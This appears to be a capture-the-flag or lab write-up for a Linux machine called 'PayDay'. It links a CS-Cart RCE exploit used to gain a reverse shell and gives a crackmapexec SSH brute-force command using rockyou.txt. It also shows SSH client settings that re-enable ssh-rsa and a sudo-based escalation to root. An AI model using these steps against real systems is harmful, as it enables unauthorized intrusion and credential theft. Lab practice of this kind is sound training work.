# 💰 PayDay (Linux)

## 🌐 Initial Foothold

- Discovered a CS-Cart web application running on the target machine.
- Identified it as vulnerable using the following exploit resources:
  - 📄 https://www.exploit-db.com/exploits/48891
  - 💡 https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c
- Successfully obtained a reverse shell through CS-Cart RCE.

---

## 🧑‍💻 Privilege Escalation

- Found user `patrick` present on the system.
- Used `crackmapexec` to brute-force SSH credentials with rockyou.txt:
  ```bash
  crackmapexec ssh 192.168.126.39 -u patrick -p /home/kali/Downloads/rockyou.txt
  ```
  ✅ Found credentials: `patrick:patrick`

- Couldn’t SSH initially due to key negotiation failure.
- Appended the following lines to the SSH config to fix the issue:
  ```
  HostKeyAlgorithms +ssh-rsa
  PubkeyAcceptedAlgorithms +ssh-rsa
  ```
  Edited using:
  ```bash
  sudo nano /etc/ssh/ssh_config
  ```

- Logged in using:
  ```bash
  ssh patrick@192.168.126.39
  ```

- Ran `sudo -l` and saw full sudo access.
- Switched to root using:
  ```bash
  sudo su
  ```

---

## 🧠 Key Takeaways

- 🛍️ CS-Cart known vulnerabilities provide fast shell access.
- 🧑‍💻 SSH brute-force + patched SSH client config = easy entry.
- 🔐 Always check `sudo -l` right after user access.